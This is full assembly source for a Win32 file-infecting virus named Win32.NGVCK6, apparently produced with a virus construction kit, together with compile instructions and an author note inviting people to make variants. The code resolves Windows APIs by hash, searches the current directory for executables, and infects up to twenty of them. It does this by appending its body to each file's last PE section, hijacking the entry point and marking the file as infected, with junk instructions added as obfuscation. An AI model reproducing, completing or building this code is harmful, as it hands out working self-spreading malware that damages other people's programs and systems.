              
;
;
; Win32.NGVCK6 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK6
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 33
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop edx
                                        ; mov ebp, edx
                                        ; clear ebp
 and ebp, 0
 add ebp, edx
 sub ebp, offset Delta
 jmp KernelSearchStart


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov eax, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov ebx, eax
 add ebx, [eax+3Ch]
                                        ; get File Alignment
                                        ; add ebx, 60
 dec ebx
 add ebx, 61d
 mov eax, [ebx]
                                        ; mov ecx, 60
 push 60d
 pop ecx
 sub ebx, ecx
                                        ; mov ecx, -1
 mov ecx, 0
 add ecx, -1d
 and ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], eax
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
                                        ; infect by increasing the last section
                                        ; clear esi
 mov esi, -20513d
 add esi, 20513d
 add esi, ebx
                                        ; get last section
 movzx ecx, word ptr [esi+06h]
 dec ecx
 add eax, ebx                           ; Trash
 imul ecx, ecx, 28h
                                        ; add ebx, 120
 add ebx, 120d
 add ebx, ecx
 mov edx, dword ptr [esi+74h]
 clc
 rcl edx, 3
 add ebx, edx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], eax
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
                                        ; clear edx
 xor edx, edx

 add edx, [ebx+10h]
                                        ; mov eax, edx
                                        ; clear eax
 xor eax, eax
 add eax, edx
 add edx, [ebx+14h]
 push edx
 mov ecx, eax
 add ecx, [ebx+0Ch]
 mov dword ptr [ebp+NewEIP], -1
 and dword ptr [ebp+NewEIP], ecx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], ecx
                                        ; clear ecx
 mov ecx, 13794d
 sub ecx, 13794d

 add ecx, [ebx+10h]
 push ecx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ecx
 call Align
                                        ; clear ecx
 mov ecx, 0
 add ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebx+10h], 0h
 add dword ptr [ebx+10h], ecx
 pop ecx
 add ecx, VirusSize
 mov dword ptr [ebx+08h], ecx
 mov ecx, dword ptr [ebx+10h]
 add ecx, dword ptr [ebx+0Ch]
 mov dword ptr [esi+50h], ecx
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 lea edx, [ebp+Virus]
 xchg esi, edx

 add edi, dword ptr [ebp+MapAddress]
 mov eax, VirusSize

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov eax, dword ptr [ebp+InfCounter]
 add eax, -1
 mov dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 stc
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ecx
 xor ecx, ecx

 push ecx
 push ecx
 push 3h
 push ecx
                                        ; add ecx, 1
 inc ecx
 push ecx
 push 80000000h or 40000000h
 adc edx, ebx                           ; Trash
 lea ecx, [ebp+WFD_szFileName]
 rol eax, 17d                           ; Trash
 xchg ecx, edx

 push edx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx

                                        ; clear ebx
 mov ebx, -8524d
 add ebx, 8524d
 push ebx
 inc edx                                ; Trash
 push ecx
 push ebx
                                        ; mov edx, 4
 mov edx, 0
 add edx, 4d
 push edx
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
 cmp eax, 0
 je CloseFile
 push ecx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 inc ebx                                ; Trash
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
 add eax, 50344710d                     ; Trash
                                        ; store old EIP and ImageBase
                                        ; clear ecx
 xor ecx, ecx
 add ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ecx

 mov edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edx



ExecuteHost:                            ; Start the infected File
 sub dword ptr [ebp+Trash1], ecx        ; Trash

                                        ; check if we are first generation
 sub ebp, 1
 add ebp, 1
 jz FirstGenHost
 mov ecx,12345678h
 org $-4
 retEIP dd 0h
 add ecx,12345678h
 org $-4
 retBase dd 0h
 push ecx
ret

 shl ebx, 21d                           ; Trash


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

 xor ecx, edx                           ; Trash
InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 mov ecx, offset WFD_szFileName
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea edx, [ebp+WFD_szFileName]


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 add eax, -1
 add eax, 1
 jz NoInfection
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
                                        ; mov edx, 35565
 mov edx, ( 35565d + 2d )
 sub edx, 2d
 test edx, edx
 jnz Notagoodfile
Goodfile:
 cmp word ptr [ecx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [ecx+3Ch]
 pop eax
                                        ; check if header lies inside the file
 cmp eax, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add eax, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [eax], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov dx, word ptr [eax+16h]
 and dx, 00002h
 cmp dx, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov dx, word ptr [eax+16h]
 and dx, 0F000h
 cmp dx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
 mov ebx, dword ptr [ebp+Attributes]
 push ebx
 lea esi, [ebp+WFD_szFileName]
 xchg ebx, esi

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;                  [ ///// * Data * \\\\\ ]

Data:
 FindHandle  dd 0h
 KernelMZ    dd 0h
 OldBase     dd 400000h
 OTableVA    dd 0h
 AlignReg2   dd 0h
 InfCounter  dd 0h
 NewSize     dd 0h

 APINames:
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h

 MapHandle   dd 0h
 db 'Win32.NGVCK6 created by SnakeByte',0
 MapAddress  dd 0h
 Trash2      dd 0h

 APIOffsets:
 XSetFileAttributesA    dd 0h
 XFindClose             dd 0h
 XMapViewOfFile         dd 0h
 XFindFirstFileA        dd 0h
 XFindNextFileA         dd 0h
 XCreateFileMappingA    dd 0h
 XCloseHandle           dd 0h
 XUnmapViewOfFile       dd 0h
 XGetFileAttributesA    dd 0h
 XCreateFileA           dd 0h

 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 Attributes  dd 0h
 filemask    db '*.exE',0
 OldEIP      dd 0h
 AlignReg1   dd 0h
 NewEIP      dd 0h
 TempAPI     dd 0h
 NTableVA    dd 0h
 K32Trys     dd 0h
 FileHandle  dd 0h
 Trash1      dd 0h
 counter     dw 0h
 KernelPE    dd 0h
 ATableVA    dd 0h




;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov eax, 276
 mov eax, 276d
 mov esi, ebp
 add esi, offset WFD_szFileName


ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 sub esi, -1d
 dec eax
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg esi, ecx

 push esi
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]
 xchg edx, edi
 xor dword ptr [ebp+Trash1], ebx        ; Trash

 push edx
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret





;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 and edx, 0
 mov eax, dword ptr [ebp+AlignReg1]
 div ecx
 not ebx                                ; Trash
                                        ; add eax, 1
 inc eax
 mul ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ecx, [ebx+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 dec ecx
 add ecx, 29d
                                        ; get ATableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ebx
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
                                        ; get NTableVA
 mov ebx, dword ptr [ecx]
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ebx
                                        ; get OTableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
 mov ecx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ecx
 mov edx, dword ptr [ebp+KernelMZ]
 sbb ebx, 7d                            ; Trash
 add edx, dword ptr [ecx]
                                        ; mov ecx, edx
 mov ecx, edx
                                        ; mov edi, edx
                                        ; clear edi
 mov edi, 0
 add edi, edx
 push edi
 push eax
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 push dword ptr [eax]
 pop ebx
 LoopChsksm:
                                        ; clear edx
 mov edx, 0
 mov dl, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 clc 
 sal dx,8d
 sub ebx, edx
 and dword ptr [ebp+Trash1], 155637     ; Trash
 cmp dx, 0
 je LoopConti
                                        ; clear edx
 mov edx, 56782d
 sub edx, 56782d
 mov dl, byte ptr [edi]
                                        ; add edi, 1
 inc edi
 sub ebx, edx
 or dx, dx
 jnz LoopChsksm
LoopConti:
 or ebx, ebx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop eax
 pop edi
 pop ecx
                                        ; add ecx, 4
 add ecx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2002h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 12d
                                        ; retrieve the offset
                                        ; clear edx
 sub edx, edx
 mov dx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 mov edi, edx
                                        ; clear edx
 push 0
 pop edx
 mov dx, word ptr [edi]
 sal edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [edx]
 add ecx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
                                        ; mov esi, 20
 mov esi, 0
 add esi, 20d
 add ebx, ebx                           ; Trash
 mov dword ptr [ebp+InfCounter], esi
 mov edi, ebp
 add edi, offset filemask

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 dec ecx
 inc ecx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ecx
                                        ; mov ebx, 4
 mov ebx, 4d
 sub esp, ebx
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], edx

 push dword ptr [ebp+OldBase]
 pop edx

 mov dword ptr [ebp+retBase], edx


                                        ; round to pages
 shr ecx, 16d
 inc edx                                ; Trash
 shl ecx, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 73731
 sub dword ptr [ebp+K32Trys], 3731d

GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jnz GotKernelXX
 jmp NoKernel
GotKernelXX:
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je CheckPE

GK2:
 dec ecx
 sub ecx, 65535d
 dec dword ptr [ebp+K32Trys]
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov esi, [ecx+3Ch]
 xchg esi, ecx
 add ecx, esi
 xchg esi, ecx
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
 or eax, 84708506d                      ; Trash

KernelFound:
 mov dword ptr [ebp+KernelMZ], ecx
 mov dword ptr [ebp+KernelPE], esi

 mov esi, ebp
 add esi, offset GetApis

 push esi
ret

;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov ebx, NumberOfApis

                                        ; load API Names and Offsets
 lea ecx, [ebp+APIOffsets]
 xchg edi, ecx

 lea esi, [ebp+APINames]
 xchg esi, eax


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; eax points to the CRC
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add eax, 4
 dec eax
 add eax, 5d
 mov edx, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], -1
 and dword ptr [edi], edx
                                        ; add edi, 4
 inc edi
 add edi, 3d
 dec ebx
 jnz GetApisLoop
 jmp Outbreak



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 adc eax, 82104930d                     ; Trash
 call ExitProcess



end FakeCode

